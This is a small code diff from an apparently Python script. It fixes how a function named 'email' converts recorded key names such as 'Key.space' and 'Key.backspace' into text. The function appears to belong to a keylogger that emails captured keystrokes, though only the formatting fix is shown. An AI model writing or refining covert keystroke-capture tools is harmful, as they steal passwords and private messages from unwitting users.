@@ -19,7 +19,7 @@ def email(keys):
     for key in keys:
         k = key.replace("'","")
         if key == "Key.space":
-            k.append = " "
+            k = " "
         if key == "Key.capslock":
             k = ""
         if key == "Key.backspace":
